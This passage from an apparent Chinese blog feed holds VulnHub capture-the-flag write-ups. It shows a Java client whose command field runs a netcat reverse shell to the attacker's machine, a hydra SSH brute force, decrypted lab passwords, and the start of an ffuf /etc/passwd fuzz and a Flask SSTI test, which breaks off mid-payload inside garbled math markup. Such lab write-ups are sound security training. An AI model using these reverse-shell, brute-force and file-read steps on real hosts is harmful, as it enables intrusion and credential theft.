id=\"ftp-匿名访问\"><a class=\"markdownIt-Anchor\" href=\"#ftp-匿名访问\">#</a> FTP 匿名访问</h3>\n<p>打开 <span class=\"exturl\" data-url=\"ZnRwOi8vMTkyLjE2OC4wLjE4Ni8=\">ftp://192.168.0.186/</span> 进行 ftp 信息收集<br>\n有一个文件夹 pub、里边有一个 jar 文件和一个 txt 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1434.png\" width=\"470\" alt=\"Image\">\n<p>将 ftp 服务器里的这两个文件都下载到本地，可以在 ftp 命令行中使用 lcd 来控制本地的目录</p>\n<p>note.txt 中提示 token 是 username 的 SHA 256 值，并且有一个邮箱是 alienum@exogenesis，即用户为 alienum</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1435.png\" width=\"570\" alt=\"Image\">\n<h3 id=\"java代码审计\"><a class=\"markdownIt-Anchor\" href=\"#java代码审计\">#</a> java 代码审计</h3>\n<p>将下载后的 jar 文件，用 jd-gui 打开后查看源代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1436.png\" width=\"520\" alt=\"Image\">\n<p>RE 有四个量，分别是 token，option，cmd，value，以及一些继承序列化和转变为字符串、get set 方法等</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1437.png\" width=\"620\" alt=\"Image\">\n<p>Token 由 value 和 role 组成</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1438.png\" width=\"560\" alt=\"Image\">\n<p>在 Starter 即主函数中找到了一个判断角色，当角色为 astronaut 时允许进入</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1439.png\" width=\"660\" alt=\"Image\">\n<p>先将这个 jar 文件执行一下，弹出来一个登陆框，随意输入信息之后报错，识别不到 url 地址为 warzone.local</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1440.png\" width=\"620\" alt=\"Image\">\n<p>改变本地 hosts 文件，修改其 DNS 解析地址为靶机 ip</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1441.png\" width=\"460\" alt=\"Image\">\n<p>并同时将已知用户 alienum 的 SHA 256 值计算出来，此 SHA 256 值根据提示内容来说就应该是 alienum 用户的 TOKEN 值</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1442.png\" width=\"520\" alt=\"Image\">\n<p>也可以根据 terminal 的命令来计算，在 kali 下输入如下命令即可计算 SHA 256<br>\n <code>echo -n &quot;alienum&quot; | shasum -a 256</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1443.png\" width=\"460\" alt=\"Image\">\n<p>6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec</p>\n<p>再次用 alienum 用户和他的 token 登陆发现爆了错误</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1444.png\" width=\"620\" alt=\"Image\">\n<p>在看到 java 源代码的时候，知道它执行了以个 CMd 的命令，现在我们已经可以绕过登陆并且又了 token 的值，可以写一个 java 文件执行任意命令，拿出 IDEA 其他的两个文件不变，主函数改为下面的代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1445.png\" width=\"620\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package alien;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.io.ObjectInputStream;</span><br><span class=\"line\">import java.io.ObjectOutputStream;</span><br><span class=\"line\">import java.net.Socket;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Starter &#123;</span><br><span class=\"line\">\tstatic Socket socket = null;</span><br><span class=\"line\">\tstatic ObjectOutputStream os;</span><br><span class=\"line\">\tstatic Token token;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">\t\tsocket = new Socket(&quot;warzone.local&quot;, 4444);</span><br><span class=\"line\">\t\tos = new ObjectOutputStream(socket.getOutputStream());</span><br><span class=\"line\">\t\ttoken = new</span><br><span class=\"line\">\t\tToken(&quot;6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec&quot;, &quot;astronaut&quot;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tRE list = new RE();</span><br><span class=\"line\">\t\tlist.setToken(token);</span><br><span class=\"line\">\t\tlist.setOption(&quot;VIEW&quot;);</span><br><span class=\"line\">\t\tlist.setValue(&quot;VALUE&quot;);</span><br><span class=\"line\">\t\tlist.setCmd(&quot;nc 192.168.0.168 4444 -e /bin/bash&quot;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tos.writeObject(list);</span><br><span class=\"line\">\t\tObjectInputStream is = new ObjectInputStream(socket.getInputStream());</span><br><span class=\"line\">\t\tRE response = (RE) is.readObject();</span><br><span class=\"line\">\t\tos.close();</span><br><span class=\"line\">\t\tsocket.close();</span><br><span class=\"line\">\t\tSystem.out.println(response.getValue());</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行之后 shell 成功反弹，拿到了 exomorph 的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1446.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"java脚本解密aes\"><a class=\"markdownIt-Anchor\" href=\"#java脚本解密aes\">#</a> java 脚本解密 AES</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">标准化<span class=\"built_in\">tty</span>就不多说了</span></span><br><span class=\"line\">script -qc /bin/bash /dev/null</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm;reset;stty rows 64 columns 118</span><br></pre></td></tr></table></figure>\n<p>此用户下有两个文件，cat 发现乱码，file 检查文件属性，strings 查看内容</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1447.png\" width=\"620\" alt=\"Image\">\n<p>得到了一个密码，和一个 jar 文件，将 jar 文件拉到本地导入到 jd-gui</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1448.png\" width=\"580\" alt=\"Image\">\n<p>CrypoException 是一个普通的类</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1449.png\" width=\"620\" alt=\"Image\">\n<p>Cryptor 是一个 AES 加密文件，加密过程中会调用这个里边的方法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1450.png\" width=\"620\" alt=\"Image\">\n<p>Main 函数定义要加密的 key，以及加密后的文件的路径</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1451.png\" width=\"620\" alt=\"Image\">\n<p>现在就用来写一个解密文件，用来将我们得到的密码 $:2Czq$(解密</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">先定义解密函数，通过如下方法来调用</span></span><br><span class=\"line\">public static void decrypt(String key, File inputFile, File outputFile) throws CryptoException &#123;</span><br><span class=\"line\">\tdoCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1452.png\" width=\"660\" alt=\"Image\">\n<p>再来修改主函数，密钥维持不变，修改当前的解密文件内容和解密后的文件保存路径，并且调用解密方法，最后将我们解密后的内容查看</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package alienum;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.File;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Main &#123;</span><br><span class=\"line\">\tstatic String inputPath = &quot;/Users/chentuo/JavaProjects/alienum/aliens.encrypted&quot;;</span><br><span class=\"line\">\tstatic String outputPath = &quot;/Users/chentuo/JavaProjects/alienum/aliens.txt&quot;;</span><br><span class=\"line\">\tpublic Main() &#123;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">\t\tString key = &quot;w4rz0nerex0gener&quot;;</span><br><span class=\"line\">\t\tFile inputFile = new File(inputPath);</span><br><span class=\"line\">\t\tFile decryptedFile = new File(outputPath);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\ttry &#123;</span><br><span class=\"line\">\t\t\talienum.Cryptor.decrypt(key, inputFile, decryptedFile);</span><br><span class=\"line\">\t\t&#125; catch (CryptoException var5) &#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(var5.getMessage());</span><br><span class=\"line\">\t\t\tvar5.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1453.png\" width=\"660\" alt=\"Image\">\n<blockquote>\n<p>运行此文件之后，即可以在自己设置的目录下找到我们的解密文件，但是这个解密之后的 txt 文件不能用 cat 来查看会显示乱码，用 file 命令确定是一个 data 类型后，用 strings 查看得到了解密后的文件内容<br>\n minotaur:m1nom1no…<br>\nscylla:scyscy…<br>\nechidna:ech1ech1…<br>\ncyclops:cyccyc…<br>\nanunnaki:nak1nak1…<br>\nanunnaki:nak1nak2…<br>\nanunnaki:nakinaki…</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1454.png\" width=\"560\" alt=\"Image\">\n<h3 id=\"sshpass-连接靶机\"><a class=\"markdownIt-Anchor\" href=\"#sshpass-连接靶机\">#</a> sshpass 连接靶机</h3>\n<p>得到了一串用户名和密码的组合，可能是 ssh 的用户和密码<br>\n <code>cat aliens.txt | cut -d ':' -f 1 &gt; user.txt</code> <br>\n <code>cat aliens.txt | cut -d ':' -f 2 &gt; pass.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1455.png\" width=\"420\" alt=\"Image\">\n<p>检查一下用户名和密码文件是否正确</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1456.png\" width=\"420\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-1457.png\" width=\"420\" alt=\"Image\">\n<p><code>hydra -L user.txt -P pass.txt ssh://192.168.31.53 -f -t 32 -I -vV</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1458.png\" width=\"660\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-1459.png\" width=\"660\" alt=\"Image\">\n<p>用 ssh 成功连接到了靶机中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1460.png\" width=\"480\" alt=\"Image\">\n<p>第一次登陆成功之后，第二次就可以用 sshpass 在命令行输入密码直接连接<br>\n <code>sshpass -p nak1nak1.. ssh anunnaki@192.168.0.186</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1461.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"java代码分析\"><a class=\"markdownIt-Anchor\" href=\"#java代码分析\">#</a> java 代码分析</h3>\n<p>检索服务器文件，看到提示文件与一个 gpg 的加密文件，info.txt 提示要用–batch 来解密 gpg 文件，否则不会让输入密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1462.png\" width=\"560\" alt=\"Image\">\n<p>然而直接解密是可以弹出来输入密码的界面的，输入 ssh 爆破出来的密码 nak1nak1… 可以成功解密 gpg 为 jar 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1463.png\" width=\"420\" alt=\"Image\">\n<p>同样的下载到本地，用 jd-gui 打开，开始阅读源码，Cryptor.class 里边定义了一个加、解密方法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1464.png\" width=\"660\" alt=\"Image\">\n<p>Main.class 中设有盐值，并且在条件判断正确时为打印 passwd</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1465.png\" width=\"660\" alt=\"Image\">\n<p>Recources.class 里边是一些加密的字符串</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1466.png\" width=\"600\" alt=\"Image\">\n<p>编写 java 代码，进行解密，代码内容如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.security.NoSuchAlgorithmException;</span><br><span class=\"line\">import javax.crypto.BadPaddingException;</span><br><span class=\"line\">import javax.crypto.IllegalBlockSizeException;</span><br><span class=\"line\">import javax.crypto.NoSuchPaddingException;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Main &#123;</span><br><span class=\"line\">\tpublic static void main(String[] args) throws NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException &#123;</span><br><span class=\"line\">\tCryptor cryptor = new Cryptor();</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tString plaintext = cryptor.decrypt(cryptor.decrypt(&quot;pr0tect1on1smust&quot;, &quot;/aom7EHcuiCWzNArA72UVn0nnVtJ5jZSPHDmjFPc5KQ=&quot;), &quot;jJ2Mrz4wjZDMSPwDr6TolQ==&quot;);</span><br><span class=\"line\">\tSystem.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1467.png\" width=\"660\" alt=\"Image\">\n<p>运行代码，成功解密出来了密码为 ufo_phosXEN</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1468.png\" width=\"660\" alt=\"Image\">\n<p>判断一下这个密码属于哪个用户，发现就是 root 用户的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1469.png\" width=\"580\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/143%20ORASI/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/143%20ORASI/",
            "title": "VULNHUB 43 ORASI",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvb3Jhc2ktMSw2NjAv\">https://www.vulnhub.com/entry/orasi-1,660/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTYzMTYyNzQuaHRtbA==\">https://www.cnblogs.com/sainet/p/16316274.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 ORASI：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机地址<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1242.png\" width=\"520\" alt=\"Image\">\n<p>2 ）扫到 ip 之后对 ip 进行端口扫描<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1243.png\" width=\"660\" alt=\"Image\">\n<blockquote>\n<p>这样扫看似扫出来了所有的端口，但是端口里的具体信息却没有识别，由于之前很多次都是因为在端口扫描阶段没有继续深入扫描端口信息而无法渗透，比如 git 泄漏、dns 解析域名泄漏、各种服务的版本都含有更多的敏感信息。因此，需要对得到的服务器进一步深入扫描得到端口信息</p>\n</blockquote>\n<p>3 ）端口详细扫描<br>\n <code>sudo nmap -A -p- 192.168.31.17 --min-rate 5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1244.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.17 靶机开放端口 21,22,80,5000</p>\n<h3 id=\"ida反编译elf\"><a class=\"markdownIt-Anchor\" href=\"#ida反编译elf\">#</a> IDA 反编译 ELF</h3>\n<p>匿名登陆 ftp 服务器寻找敏感信息，得到 pub 文件夹下的 url 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1245.png\" width=\"420\" alt=\"Image\">\n<p>用 file 命令可以判断出 url 是一个 ELF 文件，要反编译 ELF 文件需要借助 IDA, 工具，这里将此文件传输到了一台具有 IDA 工具的电脑上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1246.png\" width=\"660\" alt=\"Image\">\n<p>反编译之后在 main 方法中看到 /sh4d0w$s</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1247.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"leet加密语言\"><a class=\"markdownIt-Anchor\" href=\"#leet加密语言\">#</a> leet 加密语言</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc=\">http://192.168.31.17</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1248.png\" width=\"280\" alt=\"Image\">\n<p>看到一个奇怪的数字和英文单词 leet，查了一下其具体代表什么含义</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1249.png\" width=\"680\" alt=\"Image\">\n<p>原来是一种黑客的加密语言，可以根据这一点生成一份字典</p>\n<p>利用 crunch 命令生成一份字典  <code>crunch 6 6 1337leet -o wordlist.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1250.png\" width=\"440\" alt=\"Image\">\n<p>由之前反编译产生的一个疑似目录的文件，进行访问</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTcvc2g0ZDB3\">http://192.168.31.17/sh4d0w</span><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mo stretchy=\"false\">]</mo><mo stretchy=\"false\">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mn>192.168.31.17</mn><mi mathvariant=\"normal\">/</mi><mi>s</mi><mi>h</mi><mn>4</mn><mi>d</mi><mn>0</mn><mi>w</mi></mrow><annotation encoding=\"application/x-tex\">s](http://192.168.31.17/sh4d0w</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mclose\">]</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">.</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord\">4</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">0</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span></span></span></span>s)</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1251.png\" width=\"380\" alt=\"Image\">\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>扫描一下此网站是否存在敏感目录  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.17/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1252.png\" width=\"660\" alt=\"Image\">\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC8=\">http://192.168.31.17:5000/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1253.png\" width=\"430\" alt=\"Image\">\n<p>访问地址 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHckcw==\">http://192.168.31.17:5000/sh4d0w$s</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1254.png\" width=\"470\" alt=\"Image\">\n<p>页面有回显表示漏洞就在这个地方，现在我们有一个敏感的 url 地址和一份字典，可以根据此字典爆破此 url 地址的输入</p>\n<h3 id=\"ffuf模糊测试\"><a class=\"markdownIt-Anchor\" href=\"#ffuf模糊测试\">#</a> ffuf 模糊测试</h3>\n<p>使用 ffuf 测试 input 的参数应该是字典中的哪个<br>\n <code>ffuf - u &quot;http://192.168.31.17:5000/sh4d0w\\$s?FUZZ=/etc/passwd&quot; -w wordli.txt -fs 8</code> <br>\n 加载到了一个为 l333tt 的地址，此种情况下页面回显为 200</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1255.png\" width=\"620\" alt=\"Image\">\n<p>访问此网站，发现了回显与输入的内容一致</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHc=\">http://192.168.31.17:5000/sh4d0w</span><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mo stretchy=\"false\">?</mo><mi>l</mi><mn>333</mn><mi>t</mi><mi>t</mi><mo>=</mo><mi>p</mi><mi>w</mi><mi>d</mi><mo stretchy=\"false\">]</mo><mo stretchy=\"false\">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mn>192.168.31.17</mn><mo>:</mo><mn>5000</mn><mi mathvariant=\"normal\">/</mi><mi>s</mi><mi>h</mi><mn>4</mn><mi>d</mi><mn>0</mn><mi>w</mi></mrow><annotation encoding=\"application/x-tex\">s?l333tt=pwd](http://192.168.31.17:5000/sh4d0w</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mclose\">?</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">t</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord mathnormal\">d</span><span class=\"mclose\">]</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">.</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord\">4</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">0</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span></span></span></span>s?l333tt=pwd)</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1256.png\" width=\"430\" alt=\"Image\">\n<p>换成其他的参数之后发现回显依旧是输入本身</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1257.png\" width=\"560\" alt=\"Image\">\n<p>利用 wappalyzer 发现网站时 python 写的、用的 flask 框架</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1258.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"ssti模板注入\"><a class=\"markdownIt-Anchor\" href=\"#ssti模板注入\">#</a> SSTI 模板注入</h3>\n<p>既然是 flask 框架，就可以测试 SSTI 模版注入</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHc=\">http://192.168.31.17:5000/sh4d0w</span><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mo stretchy=\"false\">?</mo><mi>l</mi><mn>333</mn><mi>t</mi><mi>t</mi><mo>=</mo><mo>&lt;</mo><mo stretchy=\"false\">!</mo><mo>−</mo><mo>−</mo><mi>s</mi><mi>w</mi><mi>i</mi><mi>g</mi><mtext>￼</mtext><mn>2</mn><mo>−</mo><mo>−</mo><mo>&gt;</mo><mo stretchy=\"false\">]</mo><mo stretchy=\"false\">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mn>192.168.31.17</mn><mo>:</mo><mn>5000</mn><mi mathvariant=\"normal\">/</mi><mi>s</mi><mi>h</mi><mn>4</mn><mi>d</mi><mn>0</mn><mi>w</mi></mrow><annotation encoding=\"application/x-tex\">s?l333tt=100](http://192.168.31.17:5000/sh4d0w</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mclose\">?</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">t</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mrel\">&lt;</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mclose\">!</span><span 